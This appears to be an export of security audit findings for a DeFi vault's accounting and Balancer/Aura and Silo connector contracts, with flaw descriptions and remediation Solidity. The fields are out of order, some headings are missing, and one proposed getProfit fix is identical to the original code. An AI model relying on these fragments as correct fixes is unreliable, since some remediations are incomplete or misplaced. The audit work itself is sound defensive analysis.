In `contracts/connectors/BalancerConnector.sol`, `totalLpBalanceOf(PoolInfo memory pool)` (lines 175–182) computes the connector's total Balancer LP token (BPT) holdings across unstaked BPT held directly by the connector and BPT staked in an Aura Finance reward pool (`pool.auraPoolAddress`):

```solidity
function totalLpBalanceOf(PoolInfo memory pool) public view returns (uint256) {
    uint256 auraShares;
    if (pool.auraPoolAddress != address(0)) {
        auraShares = IERC20(pool.auraPoolAddress).balanceOf(address(this));
        auraShares = IRewardPool(pool.auraPoolAddress).convertToAssets(auraShares);
    }
    return IERC20(pool.pool).balanceOf(address(this)) + auraShares;
}
```

When BPT (`pool.pool`) is staked into Aura Finance, the Aura `Booster` locks the underlying BPT in Balancer and mints an Aura deposit wrapper token (`stakingToken`) 1:1, which is staked into the Aura `BaseRewardPool` (`pool.auraPoolAddress`). In Aura's reward pool accounting:

1. **Reward-pool interface incompatibility**: Standard Aura `BaseRewardPool` contracts follow the Synthetix/Convex reward pool interface (`balanceOf`, `getReward`, `withdrawAndUnwrap`) and do not implement ERC4626's `convertToAssets(uint256)`. Calling `IRewardPool(pool.auraPoolAddress).convertToAssets(auraShares)` on a non-ERC4626 `BaseRewardPool` reverts.
2. **Share-to-underlying conversion and asset attribution mismatch**: In Aura reward pools, the user's staked balance returned by `balanceOf(address(this))` is tracked 1:1 with the Aura deposit token (`stakingToken`) and the underlying BPT (`pool.pool`), and withdrawals via `withdrawAndUnwrap(p._auraAmount, true)` (line 119) unwrap shares 1:1 back into BPT. Treating `pool.auraPoolAddress` as a dynamic exchange-rate ERC4626 vault whose `convertToAssets` converts shares to `pool.pool` misattributes the wrapper's accounting model or fails when `convertToAssets` is unavailable or reflects `stakingToken` rather than `pool.pool`.

Because `totalLpBalanceOf` is called directly by `_getPositionTVL` (line 165, used at line 172 to compute the position's TVL) and by `decreasePosition` (line 146, used to determine whether the holding position should be removed from `PositionRegistry`), any revert or miscalculation in `totalLpBalanceOf` directly impacts vault TVL reporting and position lifecycle management.

findings.remediation:
Remove the redundant/incompatible `convertToAssets` call if `balanceOf` already represents the 1:1 staked BPT balance in `BaseRewardPool`, or query the appropriate Aura staking token / reward pool balance interface consistently across deposits, withdrawals, and balance checks.

```solidity
    function totalLpBalanceOf(PoolInfo memory pool) public view returns (uint256) {
        uint256 auraShares;
        if (pool.auraPoolAddress != address(0)) {
            auraShares = IERC20(pool.auraPoolAddress).balanceOf(address(this));
        }
        return IERC20(pool.pool).balanceOf(address(this)) + auraShares;
    }
```

findings.technical_details:
The vault's Total Value Locked (`TVL`) is split across two accounting locations:
1. Active holding positions managed by connectors and registered in `PositionRegistry`, whose values and debt obligations are aggregated in `TVLHelper.getTVL` (`contracts/helpers/TVLHelper.sol`, lines 14–33).
2. Unallocated `baseToken` held directly inside `AccountingManager` (`baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`), which is added to `TVLHelper.getTVL(...)` in `AccountingManager.TVL()` (`contracts/accountingManager/AccountingManager.sol`, lines 627–630).

In `TVLHelper.getTVL`:
```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```
When the vault has debt positions (`registry.isPositionDebt(vaultId, positions[i].positionId) == true`) and `totalDebt > totalTVL` across the registered holding positions (for instance, when borrowed tokens or withdrawn liquidity have been transferred to `AccountingManager` via `retrieveTokensForWithdraw`, or when connector asset positions are smaller than debt positions while `AccountingManager` holds idle `baseToken`), `TVLHelper.getTVL` clamps the return value to `0`.

When `AccountingManager.TVL()` subsequently computes:
```solidity
return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
    - depositQueue.totalAWFDeposit;
```
the unpaid excess debt (`totalDebt - totalTVL`) is completely omitted from the calculation instead of offsetting `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`. Consequently, `TVL()`, `totalAssets()`, and `getProfit()` are overstated by `min(totalDebt - totalTVL, baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit)`.

findings.remediation:
Include the `AccountingManager`'s available `baseToken` balance when computing `totalTVL` inside `TVLHelper.getTVL` (or return a signed `int256` net position value from `TVLHelper.getTVL` so `AccountingManager.TVL()` can net excess debt against its idle `baseToken` balance before flooring at `0`).

If `TVLHelper.getTVL` accounts for the vault's `AccountingManager` available `baseToken` balance directly or returns a signed net value:

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        (address accountingManager,) = registry.getVaultAddresses(vaultId);
        if (accountingManager != address(0)) {
            (, , , , uint256 totalAWFDeposit) = AccountingManager(payable(accountingManager)).depositQueue();
            totalTVL += IERC20(baseToken).balanceOf(accountingManager);
            totalDebt += totalAWFDeposit;
        }
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

Alternatively, change `TVLHelper.getTVL` to return `(uint256 totalTVL, uint256 totalDebt)` or `int256` (`int256(totalTVL) - int256(totalDebt)`), and perform the `totalTVL < totalDebt` floor check in `AccountingManager.TVL()` after adding `baseToken.balanceOf(address(this))` and subtracting `depositQueue.totalAWFDeposit`.

Initialize the minimum tracker to `type(uint256).max`, skip the dummy position (`calculatorConnector == address(0)`), do not use `0` as a re-initialization condition inside the loop, and only fall back to `block.timestamp` when no position has set a timestamp smaller than `type(uint256).max`:

```solidity
    function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
        uint256 latestUpdateTime = type(uint256).max;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            if (positions[i].positionTimestamp < latestUpdateTime) {
                latestUpdateTime = positions[i].positionTimestamp;
            }
        }
        if (latestUpdateTime == type(uint256).max) {
            latestUpdateTime = block.timestamp;
        }
        return latestUpdateTime;
    }
```

findings.technical_details:
In `AccountingManager`, both `calculateDepositShares` (line 230) and `calculateWithdrawShares` (line 333) call `TVLHelper.getLatestUpdateTime(vaultId, registry)` to obtain `oldestUpdateTime`, and gate queue processing on the condition that a queued request's `recordTime` is no newer than `oldestUpdateTime`:

- `depositQueue.queue[middleTemp].recordTime <= oldestUpdateTime` (line 233)
- `withdrawQueue.queue[middleTemp].recordTime <= oldestUpdateTime` (line 339)

In `contracts/helpers/TVLHelper.sol` (lines 41–53), `getLatestUpdateTime` iterates through all entries returned by `registry.getHoldingPositions(vaultId)` and finds the minimum non-zero `positionTimestamp`:

```solidity
function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
    uint256 latestUpdateTime;
    HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
    for (uint256 i = 0; i < positions.length; i++) {
        if (latestUpdateTime == 0 || positions[i].positionTimestamp < latestUpdateTime) {
            latestUpdateTime = positions[i].positionTimestamp;
        }
    }
    if (latestUpdateTime == 0) {
        latestUpdateTime = block.timestamp;
    }
    return latestUpdateTime;
}
```

When the vault has no active holding positions (only the dummy position at index `0` with `positionTimestamp == 0`), `latestUpdateTime` remains `0` and defaults to `block.timestamp`, allowing the initial batch of deposits to be calculated and executed.

However, once `executeDeposit` deploys liquidity into a connector (or positions are opened across multiple connectors), `holdingPositions` contains active `HoldingPI` entries whose `positionTimestamp` is set to the `block.timestamp` of when `updateHoldingPosition` was last called on each position. For standard on-chain positions, `getTVL` computes live valuations dynamically via `IConnector(positions[i].calculatorConnector).getPositionTVL(...)`, while `positionTimestamp` remains static in storage until the position itself is modified in `PositionRegistry`.

Consequently:
1. Any subsequent `deposit` or `withdraw` call sets `recordTime = block.timestamp`, which is strictly greater than the `positionTimestamp` of any existing untouched holding position (`recordTime > oldestUpdateTime`).
2. When the manager calls `calculateDepositShares` or `calculateWithdrawShares`, the `while` loop condition `recordTime <= oldestUpdateTime` immediately evaluates to `false` on the first unprocessed request (`middleTemp`), and the function exits without advancing `middle`.
3. Unless every single holding position in `vaults[vaultId].holdingPositions` is touched to refresh its `positionTimestamp` after `recordTime` (which is Either gas-prohibitive across many positions or impossible for connectors that only update positions during liquidity changes), deposit and withdrawal calculations are stalled.

findings.remediation:
Only enforce the asynchronous timestamp freshness check on holding positions that actually rely on asynchronous/off-chain or cross-chain TVL reporting (or provide an explicit flag on `PositionBP` / `HoldingPI` indicating whether a position's TVL is asynchronously updated), while skipping synchronous on-chain positions and dummy (`calculatorConnector == address(0)`) entries in `getLatestUpdateTime`.

```solidity
    function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
        uint256 latestUpdateTime;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            if (latestUpdateTime == 0 || positions[i].positionTimestamp < latestUpdateTime) {
                latestUpdateTime = positions[i].positionTimestamp;
            }
        }
        if (latestUpdateTime == 0) {
            latestUpdateTime = block.timestamp;
        }
        return latestUpdateTime;
    }
```

Additionally, ensure that all holding positions tracked by `getLatestUpdateTime` either represent asynchronous positions whose timestamps are refreshed prior to share calculation or have their `positionTimestamp` updated when vault valuations are synchronized.

Track total calculated-but-unminted deposit shares/assets and total calculated/fulfilled-but-unexecuted withdrawal shares/assets so that `totalAssets()` and share conversions reflect only active, unencumbered vault assets and shares, and override `_decimalsOffset()` (or track internal asset balances instead of raw `baseToken.balanceOf(address(this))`) to prevent donation-based exchange-rate and profit manipulation.

In `AccountingManager.sol`, exclude reserved withdrawal assets (`currentWithdrawGroup.totalCBAmount` and remaining unexecuted `currentWithdrawGroup.totalABAmount`) from `totalAssets()` (and align share supply accounting with calculated queues):

```solidity
    function getProfit() public view returns (uint256) {
        uint256 tvl = TVL();
        if (tvl + totalWithdrawnAmount > totalDepositedAmount) {
            return tvl + totalWithdrawnAmount - totalDepositedAmount;
        }
        return 0;
    }

    /// @notice by overriding the totalAssets function, we can calculate the total assets of the vault and use the 4626 standard to calculate the shares price
    function totalAssets() public view override returns (uint256) {
        uint256 tvl = TVL();
        uint256 reservedForWithdraw = currentWithdrawGroup.totalCBAmount + currentWithdrawGroup.totalABAmount;
        return tvl > reservedForWithdraw ? tvl - reservedForWithdraw : 0;
    }
```

(Additionally, decrement `currentWithdrawGroup.totalABAmount` as withdrawals are paid out in `executeWithdraw()`, account for already-calculated shares in `depositQueue` and `withdrawQueue` when computing conversions, and track internal `baseToken` balances rather than raw `baseToken.balanceOf(address(this))`.)

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, `getProfit()` (lines 582–588) computes the vault's profit as:

```solidity
function getProfit() public view returns (uint256) {
    uint256 tvl = TVL();
    if (tvl + totalWithdrawnAmount > totalDepositedAmount) {
        return tvl + totalWithdrawnAmount - totalDepositedAmount;
    }
    return 0;
}
```

This value is consumed by `recordProfitForFee()` (lines 475–488) to compute `preformanceFeeSharesWaitingForDistribution`:

```solidity
storedProfitForFee = getProfit();
profitStoredTime = block.timestamp;

if (storedProfitForFee < totalProfitCalculated) {
    return;
}

preformanceFeeSharesWaitingForDistribution =
    previewDeposit(((storedProfitForFee - totalProfitCalculated) * performanceFee) / FEE_PRECISION);
```

And after at least 12 hours (`block.timestamp - profitStoredTime >= 12 hours`), `collectPerformanceFees()` (lines 526–541) mints `preformanceFeeSharesWaitingForDistribution` to `performanceFeeReceiver` and updates `totalProfitCalculated = storedProfitForFee`.

Using cumulative `tvl + totalWithdrawnAmount - totalDepositedAmount` in `getProfit()` instead of tracking share-price appreciation (or settling accrued fees upon withdrawal/deposit) breaks vault accounting whenever users enter or exit across profit/loss cycles:

1. **Withdrawn profits remain in `getProfit()` and dilute remaining/new shareholders**:
   When a user withdraws via `executeWithdraw()` (which only requires `withdrawWaitingTime = 6 hours`, shorter than the `12 hours` required by `collectPerformanceFees()`), `TVL()` decreases by the withdrawn assets while `totalWithdrawnAmount` increases by the same amount (`totalWithdrawnAmount += processedBaseTokenAmount` at line 436). Consequently, `tvl + totalWithdrawnAmount - totalDepositedAmount` remains unchanged even though the profit has already left the vault with the withdrawing user.
   When `recordProfitForFee()` is subsequently called, `previewDeposit` (which uses `totalAssets() = TVL()` at line 591) converts the fee on the **entire** cumulative profit (including the already-withdrawn profit) into shares valued at the remaining, smaller `TVL()` and `totalSupply()`. When `collectPerformanceFees()` mints those shares, the remaining shareholders—or new depositors who entered after the profit was already withdrawn and made zero profit themselves—pay 100% of the performance fee on profits taken by prior users.

2. **Losses permanently distort subsequent profit calculations**:
   If the vault incurs a loss of `X` and earlier users withdraw (or remain), `tvl + totalWithdrawnAmount` falls below `totalDepositedAmount` by `X`. When new users later deposit and the vault generates a positive return `< X` on the new capital, `tvl + totalWithdrawnAmount` remains `<= totalDepositedAmount`, causing `getProfit()` to return `0`. Conversely, if `totalProfitCalculated` reached a high-water mark prior to users withdrawing and new users depositing, `getProfit()` mixes historical realized cash flows with current active capital rather than measuring profit on the active shares.

findings.remediation:
Track profit and performance fees based on the vault's share price (high-water mark per share) rather than cumulative raw `totalDepositedAmount` and `totalWithdrawnAmount`, or adjust the baseline accounting whenever shares are minted/burned so that withdrawn profits and prior losses are settled proportionally at withdrawal/deposit time.

Within `getProfit()`, profit for currently active shares should only reflect the unrealized gain above the high-water mark share price on active shares:

```solidity
    function getProfit() public view returns (uint256) {
        uint256 tvl = TVL();
        uint256 supply = totalSupply();
        if (supply == 0) {
            return 0;
        }
        uint256 highWaterMarkAssets = totalDepositedAmount > totalWithdrawnAmount
            ? totalDepositedAmount - totalWithdrawnAmount
            : 0;
        if (tvl > highWaterMarkAssets) {
            return tvl - highWaterMarkAssets;
        }
        return 0;
    }

    /// @notice by overriding the totalAssets function, we can calculate the total assets of the vault and use the 4626 standard to calculate the shares price
    function totalAssets() public view override returns (uint256) {
        return TVL();
    }
```

*(Note: To fully prevent withdrawal of untaxed profits, `totalDepositedAmount` should be reduced proportionally to the cost basis of burned shares upon withdrawal—or performance fees should be accrued and minted upon share price increases before withdrawals are calculated—rather than adding gross withdrawal payouts including profit to `totalWithdrawnAmount`.)*

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, `getProfit()` (lines 582–588) determines the total profit of the vault using cumulative capital flows:

```solidity
function getProfit() public view returns (uint256) {
    uint256 tvl = TVL();
    if (tvl + totalWithdrawnAmount > totalDepositedAmount) {
        return tvl + totalWithdrawnAmount - totalDepositedAmount;
    }
    return 0;
}
```

This profit value is consumed by `recordProfitForFee()` (lines 475–488), `checkIfTVLHasDroped()` (lines 493–500), and `collectPerformanceFees()` (lines 526–541) to mint performance fee shares to `performanceFeeReceiver` based on `storedProfitForFee - totalProfitCalculated`.

Relying on `tvl + totalWithdrawnAmount - totalDepositedAmount` in `getProfit()` introduces two interconnected accounting integrity failures:

1. **Withdrawal Settlement and Cumulative-Flow Mismatch:**
   When withdrawals are calculated in `calculateWithdrawShares()` (lines 344–345), `data.amount` is set to `previewRedeem(data.shares)` and added to `currentWithdrawGroup.totalCBAmount`. When `fulfillCurrentWithdrawGroup()` (lines 370–390) is called and `availableAssets < currentWithdrawGroup.totalCBAmount`, `currentWithdrawGroup.totalABAmount` is capped at `availableAssets` while `currentWithdrawGroup.totalCBAmountFullfilled` equals `currentWithdrawGroup.totalCBAmount`.
   Subsequently, in `executeWithdraw()` (lines 415–436), each user receives:
   ```solidity
   uint256 baseTokenAmount =
       data.amount * currentWithdrawGroup.totalABAmount / currentWithdrawGroup.totalCBAmountFullfilled;
   ```
   The vault transfers `baseTokenAmount - feeAmount` to `data.receiver` and `feeAmount` to `withdrawFeeReceiver`, so `TVL()` decreases by `baseTokenAmount`. However, `processedBaseTokenAmount` accumulates `data.amount` (line 421) and adds it to `totalWithdrawnAmount` (line 436). Consequently, `totalWithdrawnAmount` increases by `data.amount` while `tvl` decreases only by `baseTokenAmount`. In `getProfit()`, the sum `tvl + totalWithdrawnAmount` is artificially inflated by `data.amount - baseTokenAmount` (the withdrawal shortfall), causing a loss suffered by withdrawing users to be recorded as positive vault profit.

2. **Loss Recognition and Recovery Inconsistencies Across Capital Flows:**
   Because `getProfit()` uses global cumulative totals (`totalDepositedAmount` and `totalWithdrawnAmount`) floored at `0` rather than tracking share-price appreciation or adjusting the profit baseline on capital movements and realized losses:
   - If early depositors experience a loss (`tvl < totalDepositedAmount`) and withdraw their funds, the realized deficit remains permanently embedded in `totalDepositedAmount - totalWithdrawnAmount`. When new depositors enter the vault and generate positive investment returns, `tvl + totalWithdrawnAmount` remains below `totalDepositedAmount` until the new depositors' gains completely offset the prior cohort's realized losses, causing `getProfit()` to return `0` despite positive returns for active shareholders.
   - Conversely, when the vault records and collects performance fees on a profit (`totalProfitCalculated = storedProfitForFee`) and later suffers a loss followed by withdrawals or new deposits, `getProfit()` and `totalProfitCalculated` drift out of sync with the actual per-share high-water mark.

findings.remediation:
Track profit and high-water mark using share price (exchange rate between `totalAssets()` and `totalSupply()` excluding uncollected fee shares) or adjust the accounting baseline upon withdrawal execution so that realized losses and actual disbursed withdrawal amounts (`baseTokenAmount`) are accurately reflected.

If maintaining cumulative flow accounting, ensure `totalWithdrawnAmount` only records actual disbursed assets (`baseTokenAmount` prior to withdrawal fee deduction) and adjust the baseline when losses are realized:

```solidity
    function getProfit() public view returns (uint256) {
        uint256 tvl = TVL();
        uint256 effectiveWithdrawn = totalWithdrawnAmount;
        if (tvl + effectiveWithdrawn > totalDepositedAmount) {
            return tvl + effectiveWithdrawn - totalDepositedAmount;
        }
        return 0;
    }
```

Additionally, in `executeWithdraw()`, increment `processedBaseTokenAmount` by the actual `baseTokenAmount` (before deducting `feeAmount`) rather than `data.amount`, and adjust `totalDepositedAmount` / `totalProfitCalculated` proportionally when shares are redeemed at a loss.

findings.technical_details:
`AccountingManager` inherits from OpenZeppelin's `ERC4626` and overrides `totalAssets()` at lines 591–593 to price shares during deposit calculations (`previewDeposit`), withdrawal calculations (`previewRedeem`), and performance fee calculations (`recordProfitForFee`):

```solidity
function totalAssets() public view override returns (uint256) {
    return TVL();
}
```

Where `TVL()` is defined at lines 627–630 as:

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

In `AccountingManager`, withdrawals follow a multi-step asynchronous lifecycle:
1. Users queue withdrawal requests via `withdraw(share, receiver)` (line 304).
2. The manager calls `calculateWithdrawShares(maxIterations)` (line 328), which computes `uint256 assets = previewRedeem(data.shares)` (line 344), fixes `data.amount = assets` (line 345), and adds those assets to `currentWithdrawGroup.totalCBAmount` (line 353).
3. The manager starts the group via `startCurrentWithdrawGroup()` (line 360), retrieves funds from connectors into `AccountingManager` via `retrieveTokensForWithdraw()` (line 548), and locks the available payout in `currentWithdrawGroup.totalABAmount` via `fulfillCurrentWithdrawGroup()` (line 370).
4. After `withdrawWaitingTime` (6 hours by default, line 84), `executeWithdraw()` (line 396) burns the queued shares (`_burn(data.owner, shares)` at line 419) and transfers the `baseToken` out.

Once `calculateWithdrawShares()` fixes `data.amount` (and `fulfillCurrentWithdrawGroup()` locks `totalABAmount`), the withdrawing users' claim on the vault is fixed in `baseToken` terms; they no longer participate in subsequent vault gains, and once fulfilled, their reserved `baseToken` sits idle in `baseToken.balanceOf(address(this))`. However, until `executeWithdraw()` processes the entire group:
- `totalAssets()` (`TVL()`) continues to include all assets reserved for the pending withdrawal group (`currentWithdrawGroup.totalCBAmount` / `currentWithdrawGroup.totalABAmount`).
- `totalSupply()` continues to include the unburned shares waiting in `withdrawQueue`.

Consequently, whenever the vault's active positions experience a gain or loss between `calculateWithdrawShares()` and `executeWithdraw()` (or when `executeWithdraw()` is executed across multiple batches via `maxIterations`), `totalAssets()` and `totalSupply()` reflect a blended valuation that spreads the active positions' gain or loss across already-priced exiting shares. Any call to `previewDeposit()` or `previewRedeem()` during this window computes an incorrect share price.

findings.remediation:
Track the total shares and reserved assets belonging to calculated but unexecuted withdrawal requests, exclude reserved withdrawal assets from `totalAssets()`, and override `_convertToShares` / `_convertToAssets` (or burn shares upon `calculateWithdrawShares` while deducting the reserved withdrawal liability from `totalAssets()`):

```solidity
    function getProfit() public view returns (uint256) {
        uint256 tvl = totalAssets();
        if (tvl + totalWithdrawnAmount > totalDepositedAmount) {
            return tvl + totalWithdrawnAmount - totalDepositedAmount;
        }
        return 0;
    }

    /// @notice by overriding the totalAssets function, we can calculate the total assets of the vault and use the 4626 standard to calculate the shares price
    function totalAssets() public view override returns (uint256) {
        uint256 tvl = TVL();
        uint256 reservedForWithdraw = currentWithdrawGroup.isFullfilled
            ? currentWithdrawGroup.totalABAmount
            : currentWithdrawGroup.totalCBAmount;
        return tvl > reservedForWithdraw ? tvl - reservedForWithdraw : 0;
    }
```

*(Note: When deducting `reservedForWithdraw` in `totalAssets()` and reducing `totalABAmount` as withdrawals execute in `executeWithdraw`, the corresponding calculated withdrawal shares should also be burned in `calculateWithdrawShares` or excluded from the active share supply used in `_convertToShares` and `_convertToAssets`.)*

findings.technical_details:
The vault's Total Value Locked (TVL) is calculated in `AccountingManager.TVL()` by combining the net value of all active holding positions from `TVLHelper.getTVL` with the idle `baseToken` held directly by `AccountingManager` (minus pending deposits `depositQueue.totalAWFDeposit`):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

Inside `TVLHelper.getTVL` (lines 14–33), the library iterates through all `HoldingPI` entries in `PositionRegistry`, summing asset positions into `totalTVL` and debt positions into `totalDebt`. At lines 30–33, if `totalTVL < totalDebt`, `getTVL` immediately returns `0`:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

Because `getTVL` clamps the deficit `(totalDebt - totalTVL)` to `0` at the helper boundary before `AccountingManager.TVL()` adds the idle `baseToken` balance (`baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`), any excess debt beyond connector-held assets is completely ignored rather than netted against the `baseToken` held in `AccountingManager`.

This state naturally occurs during normal vault operations—for example, when a connector borrows `baseToken` (recording a debt position) and transfers those tokens to `AccountingManager` via `retrieveTokensForWithdraw` to service withdrawal groups, or when positions held in connectors depreciate relative to debt while `AccountingManager` holds idle `baseToken` reserves.

findings.remediation:
Modify `TVLHelper.getTVL` (or return a signed/tuple value) so that the idle `baseToken` balance in `AccountingManager` is included before netting `totalDebt` against total assets, or return `(uint256 totalTVL, uint256 totalDebt)` / `int256` from `TVLHelper.getTVL` so `AccountingManager.TVL()` can net the full debt against all vault assets before clamping to zero.

Alternatively, account for the vault's idle `baseToken` balance directly within `TVLHelper.getTVL` or return `int256`:

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (int256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        return int256(totalTVL) - int256(totalDebt);
    }
```

And in `AccountingManager.TVL()`:

```solidity
    function TVL() public view returns (uint256) {
        int256 positionTVL = TVLHelper.getTVL(vaultId, registry, address(baseToken));
        int256 idleTVL = int256(baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit);
        int256 netTVL = positionTVL + idleTVL;
        return netTVL > 0 ? uint256(netTVL) : 0;
    }
```

findings.technical_details:
When a vault manager deposits into a Silo market via `SiloConnector.deposit`, the connector registers a `SILO_LP_ID` holding position in `PositionRegistry` via `registry.updateHoldingPosition(..., false)`. To remove this holding position once funds are withdrawn, `SiloConnector.withdraw` executes:

```solidity
if (closePosition && isSiloEmpty(silo)) {
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), SILO_LP_ID, abi.encode(siloToken)), "", "", true
    );
}
```

In `SiloConnector.isSiloEmpty` (lines 130–141), the contract iterates over all assets in the Silo (`silo.getAssetsWithState()`) and checks:

```solidity
if (
    IERC20(assetsS[i].collateralToken).balanceOf(address(this))
        + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this)) > 0
) {
    return false;
}
```

Because this check enforces a strict equality to zero (checking `> 0` rather than comparing against `DUST_LEVEL` defined in `BaseConnector` or allowing full share burning), the position cannot be closed in two common scenarios:

1. **Unsolicited share-balance griefing:** Both `collateralToken` and `collateralOnlyToken` implement `IShareToken` (which inherits from `IERC20Metadata`), and `ISilo` also exposes permissionless `depositFor(address _asset, address _depositor, uint256 _amount, bool _collateralOnly)`. Any external actor can transfer 1 wei of `collateralToken` or `collateralOnlyToken` directly to `SiloConnector` (or call `silo.depositFor` on behalf of `SiloConnector` for any asset in the Silo, even one the connector never interacted with).
2. **Dust-induced position retention:** Because `SiloConnector.withdraw` takes an underlying `amount` rather than burning shares directly, interest accrued on `collateralToken` between transaction construction and execution (or share-to-amount rounding in `EasyMathV2`) leaves a small residual share balance (`> 0`).

When `isSiloEmpty(silo)` returns `false`, `SiloConnector.withdraw` silently skips calling `registry.updateHoldingPosition(..., true)`, leaving the `SILO_LP_ID` holding position permanently registered in the vault's `holdingPositions` array.

findings.remediation:
Update `SiloConnector.isSiloEmpty` to compare the value or balance against a dust threshold (such as `DUST_LEVEL`), and ensure that any residual debt tokens are also checked before considerarion of the Silo as empty.

```solidity
    function isSiloEmpty(ISilo silo) public view returns (bool) {
        (, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        for (uint256 i = 0; i < assetsS.length; i++) {
            if (
                IERC20(assetsS[i].collateralToken).balanceOf(address(this))
                    + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this)) > DUST_LEVEL
                    || IERC20(assetsS[i].debtToken).balanceOf(address(this)) > DUST_LEVEL
            ) {
                return false;
            }
        }
        return true;
    }
```

findings.technical_details:
In `SiloConnector.sol`, the vault tracks its exposure to a Silo market through a single holding position identified by `SILO_LP_ID`. In `_getPositionTVL` (lines 109–128), the connector iterates over all market assets returned by `silo.getAssetsWithState()` and accounts for both deposits (`collateralToken` and `collateralOnlyToken`) and liabilities (`debtToken`) to compute the net position TVL (`totalDepositAmount - totalBAmount`).

However, when checking whether the Silo position can be closed and removed from `PositionRegistry` during `withdraw` (lines 60–64), `isSiloEmpty(ISilo silo)` (lines 130–141) only inspects the collateral share tokens:

```solidity
if (
    IERC20(assetsS[i].collateralToken).balanceOf(address(this))
        + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this)) > 0
) {
    return false;
}
```

It completely omits `IERC20(assetsS[i].debtToken).balanceOf(address(this))`.

If a connector has 0 collateral shares in the Silo while still holding non-zero `debtToken` shares, `isSiloEmpty(silo)` erroneously returns `true`. This can occur in two ways:
1. During `withdraw(..., closePosition = true)`, if all collateral is withdrawn while a small `debtToken` balance remains whose converted quote value rounds down to `0` in `SolvencyV2.convertAmountsToValues` (line 196 of `SolvencyV2.sol`, where `borrowTotalValue == 0` causes `calculateLTVs` to return `(0, 0)` and `isSolvent` to return `true`), `withdraw` succeeds and calls `registry.updateHoldingPosition(..., true)` to remove the `SILO_LP_ID` holding position while debt is still open in Silo.
2. If the connector's collateral is fully seized via liquidation leaving behind residual bad debt (`debtToken.balanceOf(address(this)) > 0` and collateral balances equal to `0`), `isSiloEmpty(silo)` returns `true` despite the unpaid debt exposure.

Once the `SILO_LP_ID` holding position is removed from `Registry`, `_getPositionTVL` is no longer called for that Silo market, causing the vault's TVL calculation to ignore the remaining debt liability (which continues to accrue interest over time).

findings.remediation:
Update `SiloConnector.isSiloEmpty` to include `IERC20(assetsS[i].debtToken).balanceOf(address(this))` in the non-zero balance check so that a Silo market is only considered empty when the connector holds no collateral shares and no debt shares across all assets in the Silo.

```solidity
    function isSiloEmpty(ISilo silo) public view returns (bool) {
        (, IBaseSilo.AssetStorage[] memory assetsS) = silo.getAssetsWithState();
        for (uint256 i = 0; i < assetsS.length; i++) {
            if (
                IERC20(assetsS[i].collateralToken).balanceOf(address(this))
                    + IERC20(assetsS[i].collateralOnlyToken).balanceOf(address(this))
                    + IERC20(assetsS[i].debtToken).balanceOf(address(this)) > 0
            ) {
                return false;
            }
        }
        return true;
    }
```

findings.technical_details:
In the Silo protocol, each market asset in `IBaseSilo.AssetStorage` tracks three `IShareToken` contracts:
- `collateralToken`: represents shares in `totalDeposits` (which accrues deposit interest over time).
- `collateralOnlyToken`: represents shares in `collateralOnlyDeposits`.
- `debtToken`: represents shares in `totalBorrowAmount` (which accrues borrow interest over time).

When a user deposits or borrows an underlying asset in Silo, the minted `collateralShare` or `debtShare` is calculated proportionally to the current pool totals and existing share supply (via `EasyMathV2.toShare` / `EasyMathV2.toShareRoundUp`), rather than 1:1 with the underlying asset amount. Conversely, determining the actual underlying collateral and debt amounts requires converting the share balances back to underlying token amounts using the current total deposits/borrows (including interest compounded via `IInterestRateModel.getCompoundInterestRate` since the last update) and the share token's `totalSupply()`, as implemented in `SolvencyV2.getCollateralAmounts` and `SolvencyV2.getBorrowAmounts`.

